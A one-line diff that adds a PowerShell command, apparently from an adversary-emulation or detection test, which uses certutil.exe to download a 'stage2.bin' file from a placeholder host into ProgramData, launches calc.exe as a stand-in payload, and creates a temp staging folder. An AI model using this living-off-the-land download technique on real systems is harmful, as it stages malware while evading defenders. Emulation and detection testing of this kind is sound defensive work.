@@ -1,0 +1,1 @@
+<# Stage transfer #> certutil.exe -urlcache -split -f 'http://adatum.com/stage2.bin' "C:\ProgramData\stage1.bin"; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
